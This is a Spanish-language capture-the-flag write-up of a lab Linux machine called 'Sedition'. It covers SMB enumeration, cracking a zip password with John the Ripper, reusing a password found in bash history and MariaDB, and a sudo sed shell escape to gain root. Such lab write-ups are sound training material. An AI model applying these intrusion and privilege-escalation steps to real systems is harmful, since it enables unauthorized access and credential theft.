---
icon: linux
---

# Sedition ​

## 🖥️ Writeup - Sedition

**Plataforma:** The Hackers Labs\
**Sistema Operativo:** Linux

> **Tags:** `Linux` `SMB` `Zip Cracking` `John` `MariaDB` `Information Leakage` `Sudoers`

## INSTALACIÓN

Descargamos el archivo `zip` que contiene la `.ova` de la máquina Sedition, lo extraemos y la importamos en VirtualBox.

Configuramos la interfaz de red de la máquina Sedition y la iniciamos junto a nuestra máquina atacante.

## RECONOCIMIENTO DE HOSTS

En este punto, aún desconocemos la dirección `IP` asignada a la máquina, por lo que procedemos a descubrirla:

```bash
netdiscover -i eth1 -r 10.0.0.0/16
```

Info:

```
Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts               
                                                                               
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.4.1        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.3        08:00:27:67:2e:3e      1      60  PCS Systemtechnik GmbH      
 10.0.4.52       08:00:27:9a:e7:06      1      60  PCS Systemtechnik GmbH
```

Identificamos con seguridad que la `IP` de la víctima es `10.0.4.52`.

## ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para identificar qué puertos están abiertos, seguido de un escaneo más exhaustivo para enumerar las versiones y servicios que corren en ellos.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.52
```

```bash
nmap -n -Pn -sCV -p139,445,65535 --min-rate 5000 10.0.4.52
```

Info:

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-29 02:51 +0100
Nmap scan report for 10.0.4.52
Host is up (0.00020s latency).

PORT      STATE SERVICE     VERSION
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
65535/tcp open  ssh         OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 32:ca:e5:d1:12:c2:1e:11:1e:58:43:32:a0:dc:03:ab (ECDSA)
|_  256 79:3a:80:50:61:d9:96:34:e2:db:d6:1e:65:f0:a9:14 (ED25519)
MAC Address: 08:00:27:B0:A6:10 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2026-01-29T01:51:40
|_  start_date: N/A
|_nbstat: NetBIOS name: SEDITION, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.59 seconds
```

Identificamos los puertos `139` y `445` (SMB) abiertos, así como un servicio `SSH` corriendo en un puerto no estándar, el `65535`.

## ENUMERACIÓN SMB

Dado que los puertos de `Samba` están abiertos, utilizamos `enum4linux` para intentar listar usuarios y recursos compartidos.

```bash
enum4linux -a 10.0.4.52
```

Info:

```

 =============================( Enumerating Workgroup/Domain on 10.0.4.52 )=============================
[+] Got domain/workgroup name: WORKGROUP
...
 =================================( Nbtstat Information for 10.0.4.52 )=================================
Looking up status of 10.0.4.52
	SEDITION        <00> -         B <ACTIVE>  Workstation Service
...
 =========================================( Users on 10.0.4.52 )=========================================
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: cowboy	Name: cowboy	Desc: 
...
 ===================================( Share Enumeration on 10.0.4.52 )===================================
	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	backup          Disk      
	IPC$            IPC       IPC Service (Samba Server)
	nobody          Disk      Home Directories
...
[+] Attempting to map shares on 10.0.4.52
//10.0.4.52/print$	Mapping: DENIED Listing: N/A Writing: N/A
//10.0.4.52/backup	Mapping: OK Listing: OK Writing: N/A
...
 ====================( Users on 10.0.4.52 via RID cycling (RIDS: 500-550,1000-1050) )====================
S-1-22-1-1000 Unix User\debian (Local User)
S-1-22-1-1001 Unix User\cowboy (Local User)
```

La herramienta nos revela información muy valiosa, existen los usuarios `cowboy` y `debian`.

El recurso compartido `backup` parece ser accesible sin credenciales (Mapping: OK).

Procedemos a inspeccionar el contenido del recurso `backup` utilizando `smbclient` y el usuario `guest`.

```bash
smbclient //10.0.4.52/backup -U guest
```

Info:

```
Password for [WORKGROUP\guest]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jul  6 19:02:53 2025
  ..                                  D        0  Sun Jul  6 20:15:13 2025
  secretito.zip                       N      216  Sun Jul  6 19:02:31 2025

		19480400 blocks of size 1024. 16261992 blocks available
smb: \> get secretito.zip 
getting file \secretito.zip of size 216 as secretito.zip (52.7 KiloBytes/sec) (average 52.7 KiloBytes/sec)
smb: \> exit
```

Encontramos un archivo llamado `secretito.zip`, el cual descargamos a nuestra máquina local.

Al intentar descomprimirlo, nos solicita una contraseña que desconocemos.

```bash
unzip secretito.zip 
```

Info:

```
Archive:  secretito.zip
[secretito.zip] password password: 
   skipping: password                incorrect password
```

## CRACKING

Para obtener la contraseña del archivo comprimido, primero extraemos su `hash` utilizando `zip2john`.

```bash
zip2john secretito.zip > hash3.txt
```

A continuación, utilizamos `John the Ripper` junto con el diccionario `rockyou.txt` para intentar crackear el `hash`.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash3.txt
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sebastian        (secretito.zip/password)     
1g 0:00:00:00 DONE (2026-01-29 02:56) 50.00g/s 204800p/s 204800c/s 204800C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Obtenemos la contraseña del archivo zip: `sebastian`.

Ahora sí, descomprimimos el archivo para ver su contenido.

```bash
unzip secretito.zip 
```

Info:

```
elbunkermolagollon123
```

El archivo contiene lo que parece ser una contraseña: `elbunkermolagollon123`.

Probamos a reutilizar esta contraseña con el usuario `cowboy` para conectarnos al servicio `SSH` en el puerto `65535`.

```bash
ssh cowboy@10.0.4.52 -p 65535
```

## MOVIMIENTO LATERAL

Una vez dentro, realizamos una enumeración básica del sistema para buscar vías de escalada o movimiento lateral. Revisando el `historial de comandos` del usuario `cowboy`, encontramos información sensible.

```bash
cat .bash_history
```

Info:

```
history
exit
mariadb
mariadb -u cowboy -pelbunkermolagollon123
su debian
```

El historial revela que el usuario se ha conectado a `MariaDB` utilizando la misma contraseña que usamos para el `SSH`, y que posteriormente intentó cambiar al usuario `debian`.

Aprovechamos esta información para conectarnos a la base de datos y enumerar su contenido.

```bash
mariadb -u cowboy -p
```

Listamos las bases de datos y tablas disponibles.

```sql
MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| bunker             |
| information_schema |
+--------------------+
2 rows in set (0,002 sec)

MariaDB [(none)]> use bunker;
Database changed
MariaDB [bunker]> SHOW TABLES;
+------------------+
| Tables_in_bunker |
+------------------+
| users            |
+------------------+
1 row in set (0,000 sec)
Consultamos la tabla users.

SQL
MariaDB [bunker]> SELECT * FROM users;
+--------+----------------------------------+
| user   | password                         |
+--------+----------------------------------+
| debian | 7c6a180b36896a0a8c02787eeafb0e4c |
+--------+----------------------------------+
1 row in set (0,000 sec)
```

Obtenemos un `hash MD5` para el usuario `debian`. Tras crackearlo (podemos usar herramientas online como `CrackStation`), obtenemos la contraseña en texto plano: `password1`.

Con esta credencial, migramos al usuario debian.

```bash
su debian
```

## ESCALADA DE PRIVILEGIOS

Comprobamos permisos `sudo` y `SUID` para el usuario debian.

```bash
sudo -l
```

Info:

```
Matching Defaults entries for debian on sedition:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User debian may run the following commands on sedition:
    (ALL) NOPASSWD: /usr/bin/sed
```

Vemos que tenemos permisos para ejecutar `sed` como `root` sin contraseña. Consultamos `GTFOBins` y encontramos que podemos usar sed para invocar una shell.

```bash
sudo /usr/bin/sed -n '1e exec /bin/sh 1>&0' /etc/hosts
```

Info:

```
# whoami
root
#
```

Ya somos root!

Por último, obtenemos las `flags` de usuario y root.

```
cat /home/debian/flag.txt
pingxxxxxxxxxxxinazo
cat /root/root.txt
laflagdelxxxxxxxxxolaaunmas
```
